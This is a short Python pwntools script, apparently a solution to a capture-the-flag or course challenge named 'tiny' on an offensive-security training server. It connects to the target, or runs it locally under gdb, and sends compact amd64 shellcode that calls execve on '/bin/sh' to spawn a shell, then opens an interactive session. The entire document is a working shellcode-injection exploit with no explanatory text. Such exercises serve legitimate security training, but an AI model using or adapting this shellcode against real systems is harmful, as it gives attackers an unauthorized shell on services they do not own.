from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']


if "REM" in args:
        r = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)

else:
        r = process("./tiny")
        gdb.attach(r,'''
                b main
                c
                ''')
        input("wait")


context.arch = "amd64"

asm_code = """
push rdx
pop rax
add al, 0x10
push rax
pop rdi
xor eax, eax
mov al, 0x3b
xor edx, edx
xor esi, esi
syscall
.string "/bin/sh"
"""
r.recvuntil("> ")
r.sendline(asm(asm_code))

r.interactive()